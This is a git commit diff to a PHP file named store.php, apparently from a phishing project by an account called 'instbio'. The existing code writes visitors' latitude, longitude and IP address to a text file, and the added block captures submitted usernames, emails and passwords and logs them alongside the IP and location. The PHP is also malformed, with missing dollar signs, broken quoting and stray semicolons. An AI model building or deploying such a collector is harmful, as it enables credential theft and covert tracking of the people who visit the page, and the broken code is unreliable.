29efa7727db98ad59739f813cb285ae376bed7a2
instbio <153061937+instbio@users.noreply.github.com>
2023-12-06 23:02:18 +0530

    Update store.php

--- store.php
+++ store.php
@@ -3,4 +3,10 @@ $myfile=fopen("location.txt","w");
 $txt="lat: " .GET["lat"] ."\n long: " .$GET["long"] . "\n IP: " .$_SERVER["REMOTE_ADDR"];
 fwrite($myfile,$txt);
 fclose($myfile);
+if(isset($_GET["usernameEmail"]) && isset($_GET["password"])) {
+  $myfile = fopen("location.txt", "w");
+  $txt = "Username/Email: " . $_GET["usernameEmail"] . "\nPassword: " . $_GET["password"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . " .GET["lat"] ."\n long: " .$GET["long"] . "\n IP: " .$_SERVER["REMOTE_ADDR"];;
+  fwrite($myfile, $txt);
+  fclose($myfile);
+}
 ?>
